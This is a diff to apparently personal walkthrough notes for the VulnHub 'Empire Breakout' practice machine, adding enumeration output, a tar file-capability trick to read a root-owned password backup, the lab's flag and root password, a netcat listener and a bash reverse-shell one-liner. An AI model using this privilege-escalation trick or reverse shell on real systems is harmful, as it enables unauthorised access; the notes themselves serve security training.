@@ -4,6 +4,9 @@
                     Empire Breakout 
 				 -----------------------
 https://medium.com/@the.opemi.aa/walk-through-vulnhub-empire-breakout-c36a43ab4b46				 
+https://www.cybersecmastery.in/2022/05/empire-breakout-vulnhub-complete.html
+
+
 				 
 The machine will automatically be assigned an IP address from the network DHCP. It will be visible on the login screen. The target machine's IP address can be seen in the following screenshot. 		
 
@@ -71,7 +74,61 @@ don't worry no one will get here, it's safe to share with you my access. Its enc
    
    $ cat user.txt
     3mp!r3{You_Manage_To_Break_To_My_Secure_Access}
-	
-9. run the nnext commands
-    whoami : 	
+	whoami
+9. run the next commands
+    whoami : 	cyber
+	pwd: /home/cyber
+	cd home
+	cd ../
+	ls: 
+	 bin  boot dev etc home  initrd.img initrd.img.old
+     lib lib32 lib64 libx32 lost+found media mnt opt proc root
+     run sbin srv sys tmp usermin-setup.out usr var vmlinuz
+   vmlinuz.old webmin-setup.out
+    cd var 
+	ls 
+      cache lib local lock log mail opt run
+     spool tmp usermin webmin www
+	 cd webmin
+	  ls
+      bash: line 1: cd: /var/webmin: Permission denied
+10. you need to do some manual enumeration until you find 
+     the .old_pass.bak file within the /var/backups folder.	  
+11 cd ../	
+12 cd backups 
+13 ls  -la
+        drwxr-xr-x  2 root root  4096 Oct 12 15:21 .
+		drwxr-xr-x 14 root root  4096 Oct 19  2021 ..
+		-rw-r--r--  1 root root 12732 Oct 19  2021 apt.extended_states.0
+		-rw-------  1 root root    17 Oct 20  2021 .old_pass.bak
+		
+14. We can see the file is owned by root, so the password is likely related to that account, right?
+
+So, if you try and just open it, you will get permission denied. 
+we will use the commnd 'tar'.
+
+We will get around the permission issues by compressing the file,
+ and then decompressing it, bypassing the permission issue due to the 
+ unique Capability set to the tar command. 
+Moved back to where the tar command was located
+
+cd /home/cyber
+ # Compress the file
+./tar -cf password.txt /var/backups/.old_pass.bak
+ls -la
+   -rw-r--r--  1 cyber cyber  10240 Oct 14 08:47 password.txt
    
+   cat password.txt
+   
+   cat password.txt
+var/backups/.old_pass.bak0000600000000000000000000000002114134001114014303 0ustar  rootrootTs&4&YurgtRX(=~h
+
+in firefox goto https://192.168.1.205:20000/
+input  user=root  passward =  Ts&4&YurgtRX(=~h
+
+set up a listener on  local machine with netcat 
+
+nc -lvnp 20000
+execut bash command in the command shell found on the usermin dashboard.
+
+bash -i >& /dev/tcp/192.168.1.205/20000/ 0>&1
